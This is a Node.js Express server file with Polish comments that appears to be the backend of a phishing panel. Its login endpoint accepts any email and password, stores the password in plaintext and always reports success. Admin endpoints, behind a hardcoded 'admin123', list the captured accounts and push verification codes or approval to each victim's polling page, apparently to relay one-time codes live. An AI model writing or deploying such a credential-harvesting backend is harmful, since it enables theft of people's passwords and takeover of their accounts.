// server.js
const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.static('public'));

// ============================================================
// SESJE W PAMIĘCI (działa na Render)
// ============================================================
let sessions = {};

// ============================================================
// API ENDPOINTY
// ============================================================

// TEST
app.get('/api', (req, res) => {
    if (req.query.action === 'test') {
        return res.json({ 
            status: 'ok', 
            message: 'API działa na Render!',
            timestamp: new Date().toISOString()
        });
    }
    res.status(404).json({ error: 'Nieznana akcja' });
});

// SESSION - logowanie
app.post('/api', (req, res) => {
    const { action } = req.query;

    // SESSION - logowanie
    if (action === 'session') {
        const { email, password, ip } = req.body;

        if (!email || !password) {
            return res.status(400).json({ error: 'Email i hasło wymagane' });
        }

        const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2, 8);
        
        sessions[sessionId] = {
            email,
            password,
            ip: ip || 'N/A',
            timestamp: new Date().toISOString(),
            code: null,
            verified: false,
            rejected: false,
            approved: false
        };

        return res.json({ 
            success: true, 
            sessionId: sessionId,
            message: 'Zalogowano pomyślnie.'
        });
    }

    // SET-CODE - admin ustawia kod
    if (action === 'set-code') {
        const { sessionId, code, adminPassword } = req.body;

        if (!sessionId || !code) {
            return res.status(400).json({ error: 'Brak sessionId lub kodu' });
        }

        if (adminPassword !== 'admin123') {
            return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
        }

        const session = sessions[sessionId];
        if (!session) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        session.code = code;
        session.codeSetAt = new Date().toISOString();

        return res.json({ 
            success: true, 
            message: 'Kod ustawiony!'
        });
    }

    // APPROVE - admin zatwierdza
    if (action === 'approve') {
        const { sessionId, adminPassword } = req.body;

        if (!sessionId) {
            return res.status(400).json({ error: 'Brak sessionId' });
        }

        if (adminPassword !== 'admin123') {
            return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
        }

        const session = sessions[sessionId];
        if (!session) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        session.approved = true;
        session.verified = true;

        return res.json({ 
            success: true, 
            message: 'Użytkownik zatwierdzony!',
            approved: true
        });
    }

    // REJECT - admin odrzuca
    if (action === 'reject') {
        const { sessionId, adminPassword } = req.body;

        if (!sessionId) {
            return res.status(400).json({ error: 'Brak sessionId' });
        }

        if (adminPassword !== 'admin123') {
            return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
        }

        const session = sessions[sessionId];
        if (!session) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        session.rejected = true;

        return res.json({ 
            success: true, 
            message: 'Użytkownik odrzucony!',
            rejected: true
        });
    }

    // POLL - sprawdzanie statusu sesji (POST)
    if (action === 'poll') {
        const { sessionId } = req.body;

        if (!sessionId) {
            return res.status(400).json({ error: 'Brak sessionId' });
        }

        const session = sessions[sessionId];
        if (!session) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        return res.json({
            code: session.code || null,
            verified: session.verified || false,
            rejected: session.rejected || false,
            approved: session.approved || false
        });
    }

    // ADMIN SESSIONS - lista sesji
    if (action === 'sessions') {
        const { adminPassword } = req.body;

        if (adminPassword !== 'admin123') {
            return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
        }

        const sessionList = Object.keys(sessions).map(id => {
            const s = sessions[id];
            return {
                sessionId: id,
                email: s.email,
                timestamp: s.timestamp,
                hasCode: !!s.code,
                verified: s.verified || false,
                rejected: s.rejected || false,
                approved: s.approved || false
            };
        });

        sessionList.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

        return res.json({ sessions: sessionList });
    }

    res.status(404).json({ error: 'Nieznana akcja' });
});

// POLL - GET (dla prostoty)
app.get('/api', (req, res) => {
    if (req.query.action === 'poll') {
        const sessionId = req.query.sessionId;

        if (!sessionId) {
            return res.status(400).json({ error: 'Brak sessionId' });
        }

        const session = sessions[sessionId];
        if (!session) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        return res.json({
            code: session.code || null,
            verified: session.verified || false,
            rejected: session.rejected || false,
            approved: session.approved || false
        });
    }

    if (req.query.action === 'sessions') {
        const adminPassword = req.query.adminPassword;

        if (adminPassword !== 'admin123') {
            return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
        }

        const sessionList = Object.keys(sessions).map(id => {
            const s = sessions[id];
            return {
                sessionId: id,
                email: s.email,
                timestamp: s.timestamp,
                hasCode: !!s.code,
                verified: s.verified || false,
                rejected: s.rejected || false,
                approved: s.approved || false
            };
        });

        sessionList.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

        return res.json({ sessions: sessionList });
    }

    if (req.query.action === 'test') {
        return res.json({ 
            status: 'ok', 
            message: 'API działa na Render!',
            timestamp: new Date().toISOString()
        });
    }

    res.status(404).json({ error: 'Nieznana akcja' });
});

// ============================================================
// SERWOWANIE INDEX.HTML
// ============================================================
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============================================================
// START
// ============================================================
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📡 API: http://localhost:${PORT}/api?action=test`);
});
